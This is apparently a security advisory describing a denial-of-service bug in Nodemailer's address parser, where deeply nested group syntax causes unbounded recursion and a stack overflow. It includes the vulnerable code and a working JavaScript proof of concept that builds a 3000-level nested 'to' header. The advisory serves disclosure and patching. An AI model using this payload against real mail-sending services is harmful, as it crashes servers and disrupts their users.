summary: "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls\n### Summary\n\
  A DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n\
  ### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group)\
  \ are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs\
  \ flattening when nested groups appear, since such input is likely to be abnormal. (If the\
  \ address is valid, it is added as-is.) In other words, the parser flattens all nested groups\
  \ and inserts them into the final group list.\nHowever, the code implemented for this flattening\
  \ process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:)\
  \ to define a group, and commas (,) are used to separate members within a group.\nAt the following\
  \ location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\
  \nthere is code that performs this flattening. The issue occurs when the email address parser\
  \ attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3:\
  \ ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser\
  \ repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser\
  \ → ...`\nfor each nested group. As a result, when an attacker sends a header containing many\
  \ colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size\
  \ exceeded and causing the process to terminate immediately. Due to the structure of this\
  \ behavior, no authentication is required, and a single request is enough to shut down the\
  \ service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n\
  \    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(','));\
  \ // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n\
  \                groupMembers = groupMembers.concat(member.group);\n            } else {\n\
  \                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group`\
  \ is expected to contain members separated by commas, but in the attacker’s payload the group\
  \ contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls\
  \ for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\
  \nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n\
  \    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst\
  \ DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to\
  \ header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n\
  \  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing\
  \ start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n\
  \    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:',\
  \ err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n\
  );\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process\
  \ terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force\
  \ an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process\
  \ with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart\
  \ loop, causing severe resource exhaustion”"
